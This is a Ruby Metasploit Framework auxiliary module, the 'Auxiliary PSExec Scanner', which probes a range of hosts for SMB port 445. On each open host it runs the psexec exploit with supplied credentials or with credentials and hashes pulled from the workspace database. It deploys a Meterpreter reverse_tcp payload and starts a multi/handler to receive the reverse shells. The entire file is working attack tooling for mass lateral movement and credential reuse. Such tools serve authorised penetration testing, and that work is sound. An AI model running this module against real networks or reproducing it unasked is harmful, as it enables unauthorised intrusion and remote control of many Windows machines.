##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'



class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::EXE
	
	
	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Auxiliary PSExec Scanner',
				'Description'   => %q{
					PSExec scanner module that will run a psexec attack against a range of hosts
					using either a set of credentials provided or the credential saved in the
					current workspace database.
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$'
			))
		register_options(
			[
				OptString.new('SMBUser', [false, 'SMB Username', nil]),
				OptString.new('SMBPass', [false, 'SMB Password', nil]),
				OptString.new('SMBDomain', [true, "SMB Domain", 'WORKGROUP']),
				OptString.new('SHARE',     [ true,
						"The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", 'ADMIN$' ]),
				OptString.new('RHOSTS', [true, 'Range of hosts to scan.', nil]),
				OptInt.new('LPORT', [true, 'Local Port for payload to connect.', nil]),
				OptString.new('LHOST', [true, 'Local Hosts for payload to connect.', nil]),
				OptString.new('PAYLOAD', [true, 'Payload to use against Windows host',
						"windows/meterpreter/reverse_tcp"]),
				OptEnum.new('TYPE', [false, 
						'Type of credentials to use, manual for provided one, db for those found on the database',
						'manual', ['db','manual']]),
				OptString.new('OPTIONS',
				[false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
					""]),
				OptString.new('EXE::Custom', [false, 'Use custom exe instead of automatically generating a payload exe', nil]),
				OptBool.new('HANDLER',
					[ false, 'Start an Exploit Multi Handler to receive the connection', true]),
			], self.class)
		# no need for it
		deregister_options('RPORT')
		
	end
	def setup()
		# Set variables
		pay_name = datastore['PAYLOAD']
		lhost    = datastore['LHOST']
		lport    = datastore['LPORT']
		opts     = datastore['OPTIONS']
		

		if datastore['TYPE'] == "db"
			print_status("Using the credentials found in the workspace database")
			collect_hashes()
		else
			print_status("Using the username and password provided")
		end
		@pay = create_payload(pay_name,lhost,lport,opts)
		create_multihand(pay_name,lhost,lport) if datastore['HANDLER']
	end

	# Run Method for when run command is issued
	def run_host(ip)
		if check_port(ip)
			if datastore['TYPE'] == "manual"
				if not datastore['SMBUser'].nil? and not datastore['SMBPass'].nil?
					user = datastore['SMBUser']
					pass = datastore['SMBPass']
					dom = datastore['SMBDomain']
					payload = datastore['PAYLOAD']
					custexe = datastore['EXE::Custom']
					print_status("Trying #{user}:#{pass}")
					psexec(ip,user,pass,dom,payload,custexe)
					return
				end
			else
				@creds.each do |c|
					user,pass = c.split(" ")
					dom = datastore['SMBDomain']
					payload = datastore['PAYLOAD']
					custexe = datastore['EXE::Custom']
					print_status("Trying #{user}:#{pass}")
					psexec(ip,user,pass,dom,payload,custexe)
				end
			end
		else
			return
		end
	end
	
	## Run psexec on a given IP
	def psexec(ip,user,pass,dom,payload,custexe)
		psexec = framework.modules.create("exploit/windows/smb/psexec")
		psexec.share_datastore(@pay.datastore)
		psexec.datastore['PAYLOAD'] = payload
		psexec.datastore['MODULE_OWNER'] = self.owner
		psexec.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
		psexec.datastore['RHOST'] = ip
		psexec.datastore['SMBUser'] = user
		psexec.datastore['SMBPass'] = pass
		psexec.datastore['SMBDomain'] = dom
		if not datastore['EXE::Custom'].nil?
			psexec.datastore['EXE::Custom'] = custexe
		end
		psexec.datastore['SHARE'] = datastore['SHARE']
		psexec.datastore['RPORT'] = 445
		psexec.datastore['ExitOnSession'] = false
		psexec.datastore['DisablePayloadHandler'] = false
		psexec.datastore['EXITFUNC'] = 'process'
		psexec.datastore['VERBOSE'] = true
		psexec.datastore['DisablePayloadHandler'] = true
		psexec.datastore['ForceBlocking'] = true
		psexec.options.validate(psexec.datastore)
		psexec.exploit_simple(
			'LocalInput'	=> self.user_input,
			'LocalOutput'	=> self.user_output,
			'Payload'	=> payload,
			'Target'	=> 0,
			'ForceBlocking'	=> true,
			'RunAsJob'	=> false)
		Rex::ThreadSafe.sleep(4)
	end

	def check_port(ip)
		status = false
		timeout = 1000
		port = 445
		begin
			s = connect(false,
				{
					'RPORT' => 445,
					'RHOST' => ip,
					'ConnectTimeout' => (timeout / 1000.0)
				}
			)
			print_status("#{ip}:#{port} - TCP OPEN")
			status = true
		rescue ::Rex::ConnectionRefused
			vprint_status("#{ip}:#{port} - TCP closed")
		rescue ::Rex::ConnectionError, ::IOError, ::Timeout::Error
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("#{ip}:#{port} exception #{e.class} #{e} #{e.backtrace}")
		ensure
			disconnect(s) rescue nil
		end
		return status
	end

	def collect_hashes
		type = "smb_hash|password"
		@creds = []
		print_status("Collecting Hashes from the DB")
		framework.db.workspace.creds.each do |cred|
			if cred.active and cred.ptype =~ /#{type}/ and cred.user !~ /(SUPPORT|HelpAssistant|TsInternetUser|IWAM|Guest)/
				@creds << "#{cred.user} #{cred.pass}"
			end
		end
		# Make sure we only have unique credentials to minimize multiple sessions
		@creds.uniq!
		print_status("#{@creds.length} found on the Database")
	end

	# Method for checking if a listner for a given IP and port is present
	# will return true if a conflict exists and false if none is found
	def check_for_listner(lhost,lport)
		conflict = false
		framework.jobs.each do |k,j|
			if j.name =~ / multi\/handler/
				current_id = j.jid
				current_lhost = j.ctx[0].datastore["LHOST"]
				current_lport = j.ctx[0].datastore["LPORT"]
				if lhost == current_lhost and lport == current_lport.to_i
					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
					conflict = true
				end
			end
		end
		return conflict
	end
	
	# Create a payload given a name, lhost and lport, additional options
	def create_payload(name, lhost, lport, opts = "")

		pay = framework.payloads.create(name)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not opts.empty?
			opts.split(",").each do |o|
				opt,val = o.split("=", 2)
				pay.datastore[opt] = val
			end
		end
		# Validate the options for the module
		pay.options.validate(pay.datastore)
		return pay

	end

	# Starts a multi/handler session
	def create_multihand(pay_name,lhost,lport)
		print_status("Starting exploit multi handler")
		if not check_for_listner(lhost,lport)
			# Set options for module
			mul = framework.exploits.create("multi/handler")
			mul.share_datastore(@pay.datastore)
			mul.datastore['WORKSPACE'] = framework.db.workspace.name
			mul.datastore['PAYLOAD'] = pay_name
			mul.datastore['EXITFUNC'] = 'thread'
			mul.datastore['ExitOnSession'] = false
			# Validate module options
			mul.options.validate(mul.datastore)
			# Execute showing output
			mul.exploit_simple(
					'Payload'     => mul.datastore['PAYLOAD'],
					'LocalInput'  => self.user_input,
					'LocalOutput' => self.user_output,
					'RunAsJob'    => true
				)
		else
			print_error("Could not start handler!")
		end
	end

end
